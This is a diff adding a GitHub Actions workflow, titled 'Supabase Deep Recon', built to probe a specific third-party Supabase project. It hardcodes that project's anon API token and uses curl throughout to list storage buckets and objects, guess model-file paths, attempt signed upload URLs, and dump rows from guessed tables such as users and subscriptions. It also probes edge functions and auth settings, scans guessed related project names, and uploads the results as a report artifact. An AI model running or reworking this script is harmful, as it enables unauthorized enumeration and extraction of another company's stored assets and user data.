@@ -1,0 +1,124 @@
+name: Supabase Deep Recon
+
+on: workflow_dispatch
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: List storage buckets
+        run: |
+          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/bucket' \
+            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+            -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > buckets.txt
+          cat buckets.txt
+
+      - name: List objects in buckets
+        run: |
+          for bucket in models model files assets meshes textures textures_4k renders output public uploads cache static; do
+            echo "=== BUCKET: $bucket ===" >> objects.txt
+            curl -s -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/list/$bucket" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' >> objects.txt
+            echo "" >> objects.txt
+          done
+          cat objects.txt
+
+      - name: Direct model file paths
+        run: |
+          for path in models/mesh.glb models/mesh.usdz models/texture.png files/model.glb public/model.glb output/latest.glb meshes/result.glb textures/albedo.png textures/normal.png renders/preview.glb models/v2/mesh.glb output/result.glb textures_4k/albedo.png textures_4k/normal.png; do
+            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/public/$path" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
+            echo "Path $path: HTTP $STATUS" >> direct_access.txt
+            if [ "$STATUS" != "404" ]; then
+              curl -s -I -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/public/$path" \
+                -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+                -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' 2>&1 | grep -iE "content-type|content-length|x-ksync|etag|x-amz" | head -5 >> direct_access.txt
+            fi
+          done
+          cat direct_access.txt
+
+      - name: Signed URL generation
+        run: |
+          for bucket in models textures renders output files public; do
+            RESP=$(curl -s -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/upload/sign/$bucket/test.txt" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Content-Type: application/json' \
+              -d '{"expiresIn":3600}')
+            echo "Sign $bucket: $RESP" >> signed_url.txt
+          done
+          cat signed_url.txt
+
+      - name: REST API tables
+        run: |
+          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/' \
+            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+            -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > rest_tables.txt
+          cat rest_tables.txt
+
+      - name: PostgreSQL table enumeration
+        run: |
+          for table in models users tasks projects files assets meshes textures tasks_queue jobs workspaces subscriptions plans; do
+            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/$table?select=*&limit=1" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
+            BODY=$(curl -s -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/$table?select=*&limit=2" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
+            echo "Table $table [$STATUS]: $BODY" >> pg_tables.txt
+          done
+          cat pg_tables.txt
+
+      - name: Edge function probes
+        run: |
+          for fn in model download serve get-model mesh texture assets static-assets model-serve preview file v1/model v1/download v1/mesh; do
+            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/functions/v1/$fn" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Content-Type: application/json' \
+              -d '{}')
+            BODY=$(curl -s -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/functions/v1/$fn" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
+              -H 'Content-Type: application/json' \
+              -d '{}')
+            echo "Edge fn ${fn} [$STATUS]: $BODY" >> edge_functions.txt
+          done
+          cat edge_functions.txt
+
+      - name: Auth endpoints
+        run: |
+          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/auth/v1/health' \
+            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > auth_health.txt
+          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/auth/v1/settings' \
+            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > auth_settings.txt
+          cat auth_health.txt
+          cat auth_settings.txt
+
+      - name: Scan other Meshy projects
+        run: |
+          for ref in meshy meshyai mesh-ai mesh3d 3dai mesh-preview mesh-prod mesh-staging meshy-prod meshy-staging meshy-realtime; do
+            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://${ref}.supabase.co/storage/v1/bucket" \
+              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
+            echo "Project ${ref}: $STATUS" >> other_projects.txt
+          done
+          cat other_projects.txt
+
+      - name: Generate final report
+        run: |
+          echo '=== COMPREHENSIVE SUPABASE RE REPORT ===' > supabase_re_full_report.txt
+          echo 'Generated: '$(date) >> supabase_re_full_report.txt
+          echo 'Project Ref: ynfreclsxfgnqvggfpxcc' >> supabase_re_full_report.txt
+          echo '' >> supabase_re_full_report.txt
+          for f in buckets.txt objects.txt direct_access.txt signed_url.txt rest_tables.txt pg_tables.txt edge_functions.txt auth_health.txt auth_settings.txt other_projects.txt; do
+            echo "=== $f ===" >> supabase_re_full_report.txt
+            cat "$f" >> supabase_re_full_report.txt 2>/dev/null || echo '(no data)' >> supabase_re_full_report.txt
+            echo '' >> supabase_re_full_report.txt
+          done
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: supabase-re-report
+          path: supabase_re_full_report.txt
